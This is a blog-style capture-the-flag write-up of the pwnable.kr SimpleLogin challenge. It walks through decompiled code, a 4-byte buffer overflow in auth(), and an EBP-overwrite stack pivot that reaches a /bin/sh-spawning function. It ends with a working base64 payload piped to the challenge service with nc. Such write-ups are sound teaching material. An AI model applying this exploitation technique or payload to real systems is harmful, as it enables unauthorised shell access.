---
layout: post
title: "Pwnable.kr: SimpleLogin Writeup"
date: 2026-05-04
tags: [pwnable, exploit, reverse engineering]
---

## First inspection 

First, I will open the ELF file in **Ghidra** and **decompile** it:
```
  int iVar1;
  void *decoded_buffer;
  undefined1 input_buffer [30];
  uint decoded_length;
  
  memset(input_buffer,0,30);
  printf("Authenticate : ");
  __isoc99_scanf(&DAT_080da6b5,input_buffer);
  memset(&input,0,0xc);
  decoded_buffer = (void *)0x0;
  decoded_length = Base64Decode(input_buffer,&decoded_buffer);
  if (decoded_length < 13) {
    memcpy(&input,decoded_buffer,decoded_length);
    iVar1 = auth(decoded_length);
    if (iVar1 == 1) {
      correct();
    }
  }
```
In main, we can see that the program reads 30 chars of input from the user, decodes them via base64, and checks if the decoded string length is less then 13, then it copies the decoded buffer to a global variable called `input`. after that we enter the function `auth` with the decoded length as parameter.  

Then, in `auth` we see this:  
```
  int iVar1;
  undefined1 local_18 [8];
  char *local_10;
  undefined1 auStack_c [8];
  
  memcpy(auStack_c,&input,param_1);
  local_10 = (char *)calc_md5(local_18,0xc);
  printf("hash : %s\n",local_10);
  iVar1 = strcmp("f87cd601aa7fedca99018a8be88eda34",local_10);
  return iVar1 == 0;
```  
we copy `param_1` bytes from `input` to a local buffer `auStack_c` , then calculating the **MD5 hash** of the first 12 bytes of `local_18` buffer, and then if the hash is `f87cd601aa7fedca99018a8be88eda34` we return 1 and calling correct().  
But, we can see that `local_18` doesn't even come from the input or anything else, we will always be just garbage from the stack. 

## Vulnerability Analysis

So this made me think maybe I can somehow control `local_18` using the fact it is left **uninitialized**, and the `main` or `Base64Decode` stack frame will land just right to overwrite `local_18`, but I didnt really belived this was the solution mainly because I will still need to crack the hash and this could be VERY hard (close to impossible).

And then I understood that we can send **up to 12 bytes of data**, and the buffer at `auth` is only **8 bytes**, so **using the memcpy we can overflow the buffer with up to 4 bytes**.  

## Exploitation Strategy (EBP Overwrite)

from Ghidra we can see also the disassembly:  
```
LEA        EAX=>local_18,[EBP + -0x14]
ADD        EAX,0xc
MOV        dword ptr [ESP]=>local_2c,EAX
CALL       memcpy                                           
```  
so we understand that the buffer starts from `ebp + (-0x14 + 0xc)` = `ebp - 0x8`, so now we know that we can exactly **overwrite ebp using memcpy**.  

Now to try to control the program I will overwrite `ebp` with the **address of input** and also the first 8 bytes of input will be **padding+correct function address**, and then when we finish main, **the leave instruction will move the stack pointer to point to the correct function, and then the ret instruction will move the instruction pointer to correct**.  
Using **objdump** and Ghidra I found that the address of `input` is **0x0811eb40**, and the address of `correct` is **0x0804925f**.

We should also note that in the function `correct` there is a check:
```
void correct(void)
{
  if (input == -0x21524111) {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
               
  exit(0);
}
```
So we need that the first 4 bytes of input will be -0x21524111 (which is the value **0xdeadbeef**), so this works prefectly.  

See this brief summery of the registers if you didnt fully understand:  

>**Note**: reg = x means that reg points to the address x and [reg] = x means that the value in the address that reg points to is x.
> 
>in **auth()**:
>ebp = some_address_on_the_stack, [ebp] = 0x0811eb40
>moves esp to ebp -> esp = ebp = some_address_on_the_stack
>pop ebp -> ebp = 0x0811eb40, esp = some_address_on_the_stack + 4 = return address
>return to main.
> 
>in **main()**:
>....
>finish function
>leave instructios:
>moves esp to ebp -> esp = ebp = 0x0811eb40
>pop ebp -> ebp = 0xdeadbeef (ebp not in use anymore), esp = 0x0811eb40 + 4 = 0x0811eb44 (the address containing correct's address)
>ret instruction:
>eip = [esp] = 0x0804925f
>jump to correct().

## The Final Exploit

So, the final payload will be (remember the input needs to be base64 encoded):   
```
(python3 -c 'import sys, base64; payload=(0xdeadbeef).to_bytes(4, "little")+(0x804925f).to_bytes(4, "little")+(0x0811eb40).to_bytes(4, "little"); sys.stdout.write(base64.b64encode(payload).decode("ascii")+"\n")'; cat) | nc 0 9003
```

<div style="margin: 25px 0;">
  <a href="/assets/downloads/simplelogin" download style="background-color: #21262d; border: 1px solid #30363d; color: #58a6ff; padding: 10px 20px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 0.9em; display: inline-block;">
    📥 Download Simplelogin Source (simplelogin)
  </a>
</div>

